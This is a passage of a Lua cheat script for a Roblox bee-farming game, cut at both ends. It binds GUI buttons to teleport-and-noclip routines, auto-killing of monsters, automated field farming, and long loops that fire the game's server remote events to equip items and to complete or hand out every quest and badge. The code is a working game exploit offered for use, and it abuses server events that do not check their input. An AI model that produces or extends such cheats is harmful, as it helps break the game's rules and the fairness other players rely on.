      tpwindy = false
      noclip = false
      Autokillwindy.BackgroundColor3 =blue
end
end)
 
     
     
     
 
 
 
 
local tornado = false
Bringtornado.MouseButton1Down:connect(function()
if tornado == false then
      MainPage.Visible = false
      Close.Text ="+"
      tornado = true
      Bringtornado.BackgroundColor3 = red
while tornado do
wait(0.3)
local test = "Root"
local test2 = "Plane"
local tweenservice = game:GetService("TweenService")
local plr = game.Players.LocalPlayer
local info = TweenInfo.new(0.3) -- change to how long it takes to get to the item (in seconds)
local item = {}
 
for i,v in pairs(game.workspace.Particles:GetDescendants()) do
if v.Name == test or v.Name == test2 then
for _,i in pairs(game.workspace.Collectibles:GetChildren()) do
if tostring(i) == tostring(game.Players.LocalPlayer.Name) or tostring(i) == "C" then
if (i.Position-plr.Character.HumanoidRootPart.Position).magnitude <= 60 then
 
item.CFrame = CFrame.new(i.Position.x,plr.Character.HumanoidRootPart.Position.y,i.Position.z)
 
local Tween = tweenservice:Create(v, info, item)
Tween:Play()
end
end
end
end
end
end
else
      tornado = false
      Bringtornado.BackgroundColor3 = blue
end
end)
 
 
 
Equipdemonmask.MouseButton1Down:connect(function()
      MainPage.Visible = false
      Close.Text ="+"
      local A_1 = "Equip"
local A_2 =
{
      ["Mute"] = true,
      ["Type"] = "Demon Mask",
      ["Category"] = "Accessory"
}
local Event = game:GetService("ReplicatedStorage").Events.ItemPackageEvent
Event:InvokeServer(A_1, A_2)
end)
Eqipdemonmask.MouseButton1Down:connect(function()
      MainPage.Visible = false
      Close.Text ="+"
      local A_1 = "Equip"
local A_2 =
{
      ["Mute"] = true,
      ["Type"] = "Diamond Mask",
      ["Category"] = "Accessory"
}
local Event = game:GetService("ReplicatedStorage").Events.ItemPackageEvent
Event:InvokeServer(A_1, A_2)
end)
 
 
 
local Drop = false
Automagicbean.MouseButton1Down:connect(function(a)
if Drop == false then
      MainPage.Visible = false
      Close.Text ="+"
      Drop = true
      Automagicbean.BackgroundColor3 =red
      while Drop do
            wait(0.3)
     
            local A = {
 
            ["Name"] = "Magic Bean"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
            end
else
      Drop = false
      Automagicbean.BackgroundColor3 =blue
end
end)
 
     
           
 
 
 
 
 
Noclip.MouseButton1Down:Connect(function()
if noclip == false then
      noclip = true
      MainPage.Visible = false
      Close.Text ="+"
      Noclip.BackgroundColor3 = red
else
      noclip = false
      Noclip.BackgroundColor3 = blue
end
end)
 
 
 
 
 
local Windy = false
FindWindBee.MouseButton1Down:connect(function(w)
      if Windy == false then
            MainPage.Visible = false
      Close.Text ="+"
      Windy = true
      FindWindBee.BackgroundColor3 =red
      noclip = true
while Windy do
wait()
for _,v in pairs(game.workspace.NPCBees:GetChildren()) do
      if v.Name == "Windy" then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
end
end
end
else
      Windy = false
      noclip = false
      FindWindBee.BackgroundColor3 =blue
      end
end)
 
 
 
 
 
 
 
Usenightbell.MouseButton1Down:connect(function()
      MainPage.Visible = false
      Close.Text ="+"
      local A = {
 
            ["Name"] = "Night Bell"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
end)
 
 
 
 
 
Usefielddice.MouseButton1Down:connect(function()
      MainPage.Visible = false
      Close.Text ="+"
      local A = {
 
            ["Name"] = "Field Dice"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
end)
 
 
 
 
 
 
local killvici = false
Autokillvicious.MouseButton1Down:connect(function(q)
      if killvici == false then
            MainPage.Visible = false
      Close.Text ="+"
      killvici = true
      Autokillvicious.BackgroundColor3 =red
      noclip = true
      while killvici do
            wait()
           
           
      for _,i in pairs(game.workspace.Particles:GetChildren()) do
      if string.find(i.Name,"Waiti") then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = i.CFrame
      end
      end
for _,v in pairs(game.workspace.Monsters:GetChildren()) do
      if string.find(v.Name,"Vici") then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Torso.CFrame * CFrame.new(0,13,0)
           
      end
end
for _,r in pairs(game.workspace.Monsters:GetChildren()) do
      if string.find(r.Name,"Gifted") then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = r.Torso.CFrame * CFrame.new(0,13,0)
     
            end
           
      end
      end
else
      killvici = false
      noclip = false
      Autokillvicious.BackgroundColor3 =blue
      end
end)
 
SunflowerButton.MouseButton1Down:connect(function()
      tuoidz = "Sunflower Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
MushroomButton.MouseButton1Down:connect(function()
      tuoidz = "Mushroom Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
DanrButton.MouseButton1Down:connect(function()
      tuoidz = "Dandelion Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
DanrButton_2.MouseButton1Down:connect(function()
      tuoidz = "Clover Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
BlueflowerButton.MouseButton1Down:connect(function()
      tuoidz = "Blue Flower Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
BambooButton.MouseButton1Down:connect(function()
      tuoidz = "Bamboo Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
BambooButton.MouseButton1Down:connect(function()
      tuoidz = "Bamboo Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
SpiderButton.MouseButton1Down:connect(function()
      tuoidz = "Spider Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
StawberryButton.MouseButton1Down:connect(function()
      tuoidz = "Strawberry Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
StawberryButton.MouseButton1Down:connect(function()
      tuoidz = "Strawberry Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
PineappleButton.MouseButton1Down:connect(function()
      tuoidz = "Pineapple Patch"
      FieldText.Text = "Field Select: "..tuoidz
end)
StumpButton.MouseButton1Down:connect(function()
      tuoidz = "Stump Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
RoseButton.MouseButton1Down:connect(function()
      tuoidz = "Rose Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
CactusButton.MouseButton1Down:connect(function()
      tuoidz = "Cactus Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
PumpkinButton.MouseButton1Down:connect(function()
      tuoidz = "Pumpkin Patch"
      FieldText.Text = "Field Select: "..tuoidz
end)
PineTreeButton.MouseButton1Down:connect(function()
      tuoidz = "Pine Tree Forest"
      FieldText.Text = "Field Select: "..tuoidz
end)
MountainTopButton.MouseButton1Down:connect(function()
      tuoidz = "Mountain Top Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
CoconutButton.MouseButton1Down:connect(function()
      tuoidz = "Coconut Field"
      FieldText.Text = "Field Select: "..tuoidz
end)
PepperButton.MouseButton1Down:connect(function()
      tuoidz = "Pepper Patch"
      FieldText.Text = "Field Select: "..tuoidz
end)
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
local gui = Instance.new("ScreenGui",player.PlayerGui)
local frame = Instance.new("Frame",gui)
local act6 = false
local act6temp = false
local act5 = false
local function Voiddz(sanghuman,sangzboi)
local jimmy = coroutine.wrap(function()
        repeat
            local sanghuman = player.Character.HumanoidRootPart
            local hotboi = sanghuman.CFrame
            local sangzboi = workspace.FlowerZones[tuoidz].CFrame
           
        for k,v in pairs(workspace.Collectibles:GetChildren()) do
            if tostring(v) == tostring(game.Players.LocalPlayer.Name) or tostring(v) == "C" then
                        if (v.Position-sanghuman.Position).magnitude <= 60 then
                sanghuman.CFrame = CFrame.new(v.Position.x, sanghuman.Position.y, v.Position.z)
                local intvalue = Instance.new("IntValue",v)
                intvalue.Name = "Void"
 wait(.05)
end
end
end
wait(.05)
sanghuman.CFrame = sangzboi * CFrame.new(0,0,0)
wait(.05)
until not act6 or act6temp
end)
local jimmy2 = coroutine.wrap(function()
for k,v in pairs(workspace[player.Name]:GetChildren()) do
if v.ClassName == "Tool" then
repeat
v.ClickEvent:FireServer()
wait(.1)
until not act6 or act6temp
end
end
end)
jimmy()
jimmy2()
end
StartButton.MouseButton1Down:connect(function()
if act6 == true then
act6 = false
StartButton.BackgroundColor3 = blue
StartButton.Text = "START FARMING"
else
act6 = true
StartButton.BackgroundColor3 = red
StartButton.Text = "STOP FARMING"
MainPage.Visible = false
Close.Text ="+"
local jimmy3 = coroutine.wrap(function()
repeat
wait()
for k,v in pairs(workspace[player.Name]:GetChildren()) do
if v:FindFirstChild("Display") then
if v.Display.Gui.ProgressBar.Size == v.Display.Gui.RedBar.Size or v.Display.Gui.ProgressLabel == player.CoreStats.Pollen.Value.."/"..player.CoreStats.Pollen.Value then
act6temp = true
wait(3)
local sanghuman = player.Character.HumanoidRootPart
local hotboi = sanghuman.CFrame
local sangzboi = workspace.FlowerZones[tuoidz].CFrame
game:GetService("Players").LocalPlayer.Character:MoveTo(game:GetService("Players").LocalPlayer.SpawnPos.Value.p)
wait(3)
game:GetService("ReplicatedStorage").Events.PlayerHiveCommand:FireServer("ToggleHoneyMaking")
repeat wait(.1) until player.CoreStats.Pollen.Value <= 1
wait(7)                      
sanghuman.CFrame = sangzboi * CFrame.new(0,0,0)
wait(1)
local A = {
["Name"] = "Sprinkler Builder"
}
local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
Event:FireServer(A)
wait(1)
Voiddz(sanghuman,sangzboi)
act6temp = false
end
end
wait()
end
wait(1)
until not act6
end)
Voiddz(sanghuman,sangzboi)
jimmy3()   
end
end)
RemoteQuest.MouseButton1Down:connect(function()
if act5 == true then
act5 = false
RemoteQuest.BackgroundColor3 = blue
RemoteQuest.Text = "Auto Quest"
else
act5 = true
RemoteQuest.BackgroundColor3 = red
RemoteQuest.Text = "Auto Quest"
repeat
wait(5)
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Pepper")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Coconut")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Playtime")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Honey")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Quest")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Battle")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Ability")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Goo")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Sunflower")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Dandelion")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Mushroom")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Blue Flower")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Clover")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Spider")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Bamboo")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Strawberry")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Pineapple")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Pumpkin")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Cactus")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Rose")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Pine Tree")
game.ReplicatedStorage.Events.BadgeEvent:FireServer("Collect", "Stump")
game.ReplicatedStorage.Events.ToyEvent:FireServer("Glue Dispenser")
game.ReplicatedStorage.Events.ToyEvent:FireServer("Free Royal Jelly Dispenser")
game.ReplicatedStorage.Events.ToyEvent:FireServer("Blueberry Dispenser")
game.ReplicatedStorage.Events.ToyEvent:FireServer("Strawberry Dispenser")
game.ReplicatedStorage.Events.ToyEvent:FireServer("Treat Dispenser")
game.ReplicatedStorage.Events.ToyEvent:FireServer("Wealth Clock")
game.ReplicatedStorage.Events.CompleteQuestFromPool:FireServer("Brown Bear")
game.ReplicatedStorage.Events.CompleteQuestFromPool:FireServer("Polar Bear")
game.ReplicatedStorage.Events.CompleteQuestFromPool:FireServer("Honey Bee")
game.ReplicatedStorage.Events.CompleteQuestFromPool:FireServer("Black Bear")
game.ReplicatedStorage.Events.CompleteQuestFromPool:FireServer("Bucko Bee")
game.ReplicatedStorage.Events.CompleteQuestFromPool:FireServer("Riley Bee")
game.ReplicatedStorage.Events.GiveQuestFromPool:FireServer("Brown Bear")
game.ReplicatedStorage.Events.GiveQuestFromPool:FireServer("Polar Bear")
game.ReplicatedStorage.Events.GiveQuestFromPool:FireServer("Honey Bee")
game.ReplicatedStorage.Events.GiveQuestFromPool:FireServer("Black Bear")
game.ReplicatedStorage.Events.GiveQuestFromPool:FireServer("Bucko Bee")
game.ReplicatedStorage.Events.GiveQuestFromPool:FireServer("Riley Bee")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Treat Tutorial")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Treat Tutorial")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Bonding With Bees")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Bonding With Bees")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Search For A Sunflower Seed")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Search For A Sunflower Seed")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("The Gist Of Jellies")
game.ReplicatedStorage.Events.GiveQuest:FireServer("The Gist Of Jellies")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Search For Strawberries")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Search For Strawberries")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Binging On Blueberries")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Binging On Blueberries")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Royal Jelly Jamboree")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Royal Jelly Jamboree")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Search For Sunflower Seeds")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Search For Sunflower Seeds")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Picking Out Pineapples")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Picking Out Pineapples")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Seven To Seven")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Seven To Seven")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Mother Bears Midterm")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Mother Bears Midterm")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Eight To Eight")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Eight To Eight")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Sights On The Stars")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Sights On The Stars")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("The Family Final")
game.ReplicatedStorage.Events.GiveQuest:FireServer("The Family Final")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Preliminary Research")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Preliminary Research")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Biology Study")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Biology Study")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Proving The Hypothesis")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Proving The Hypothesis")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Bear Botany")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Bear Botany")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Kingdom Collection")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Kingdom Collection")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Defensive Adaptions")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Devensive Adaptions")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Benefits Of Technology")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Benefits Of Technology")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Spider Study")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Spider Study")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Roses And Weeds")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Roses And Weeds")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Blue Review")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Blue Review")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Ongoing Progress")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Ongoing Progress")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Red / Blue Duality")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Red / Blue Duality")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Costs Of Computation")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Costs Of Computation")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pollination Practice")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pollination Practice")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Optimizing Abilities")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Optimizing Abilities")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Ready For Infrared")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Ready For Infrared")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Breaking Down Badges")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Breaking Down Badges")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Subsidized Agriculture")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Subsidized Agriculture")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Meticulously Crafted")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Meticulously Crafted")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Smart, Not Hard")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Smart, Not Hard")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Limits of Language")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Limits of Language")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Patterns and Probability")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Patterns and Probability")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Chemical Analysis")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Chemical Analysis")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Mark Mechanics")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Mark Mechanics")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Meditating On Phenomenon")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Meditating On Phenomenon")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Beesperanto")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Beesperanto")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Hive Minded Bias")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Hive Minded Bias")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Mushroom Measurement Monotony")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Mushroom Measurement Monotony")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("The Power Of Information")
game.ReplicatedStorage.Events.GiveQuest:FireServer("The Power Of Information")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Testing Teamwork")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Testing Teamwork")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Epistemological Endeavor")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Epistemological Endeavor")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Egg Hunt: Panda Bear")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Egg Hunt: Panda Bear")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Lesson On Ladybugs")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Lesson On Ladybugs")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Rhino Rumble")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Rhino Rumble")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Beetle Battle")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Beetle Battle")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Spider Slayer")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Spider Slayer")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Ladybug Bonker")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Ladybug Bonker")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Spider Slayer 2")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Spider Slayer 2")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Rhino Wrecking")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Rhino Wrecking")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Final Showdown")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Final Showdown")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Werewolf Hunter")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Werewolf Hunter")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Skirmish with Scorpions")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Skirmish with Scorpions")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Mantis Massacre")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Mantis Massacre")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("The REAL Final Showdown")
game.ReplicatedStorage.Events.GiveQuest:FireServer("The REAL Final Showdown")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Ant Arrival")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Ant Arrival")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Winged Wack Attack")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Winged Wack Attack")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Fire Fighter")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Fire Fighter")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Army Ant Assault")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Army Ant Assault")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Colossal Combat")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Colossal Combat")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Eager Exterminator")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Eager Exterminator")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Leaper Lickin'")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Leaper Lickin'")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Colossal Combat 2")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Colossal Combat 2")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Outrageous Onslaught")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Outrageous Onslaught")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Royal Rumble")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Royal Rumble")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Ultimate Ant Annihilation 1")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Ultimate Ant Annihilation 1")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Ultimate Ant Annihilation 2")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Ultimate Ant Annihilation 2")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Ultimate Ant Annihilation 3")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Ultimate Ant Annihilation 3")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Ultimate Ant Annihilation 4")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Ultimate Ant Annihilation 4")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Ultimate Ant Annihilation 5")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Ultimate Ant Annihilation 5")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Star Journey 1")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Star Journey 1")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Star Journey 2")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Star Journey 2")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Star Journey 3")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Star Journey 3")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Star Journey 4")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Star Journey 4")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Star Journey 5")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Star Journey 5")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Egg Hunt: Riley Bee")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Egg Hunt: Riley Bee")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Egg Hunt: Bucko Bee")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Egg Hunt: Bucko Bee")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Sunflower Start")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Sunflower Start")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Dandelion Deed")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Dandelion Deed")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pollen Fetcher")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pollen Fetcher")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Red Request")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Red Request")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Into The Blue")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Into The Blue")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Variety Fetcher")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Variety Fetcher")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Bamboo Boogie")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Bamboo Boogie")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Red Request 2")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Red Request 2")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Cobweb Sweeper")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Cobweb Sweeper")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Leisure Loot")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Leisure Loot")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("White Pollen Wrangler")
game.ReplicatedStorage.Events.GiveQuest:FireServer("White Pollen Wrangler")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pineapple Picking")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pineapple Picking")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pollen Fetcher 2")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pollen Fetcher 2")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Weed Wacker")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Weed Wacker")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Red + Blue = Gold")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Red + Blue = Gold")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Colorless Collection")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Colorless Collection")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Spirit of Springtime")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Spirit of Springtime")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Weed Wacker 2")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Weed Wacker 2")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pollen Fetcher 3")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pollen Fetcher 3")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Lucky Landscaping")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Lucky Landscaping")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Azure Adventure")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Azure Adventure")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pink Pineapples")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pink Pineapples")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Blue Mushrooms")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Blue Mushrooms")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Cobweb Sweeper 2")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Cobweb Sweeper 2")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Rojo-A-Go-Go")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Rojo-A-Go-Go")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pumpkin Plower")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pumpkin Plower")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pollen Fetcher 4")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pollen Fetcher 4")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Bouncing Around Biomes")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Bouncing Around Biomes")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Blue Pineapples")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Blue Pineapples")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Rose Request")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Rose Request")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Search For The White Clover")
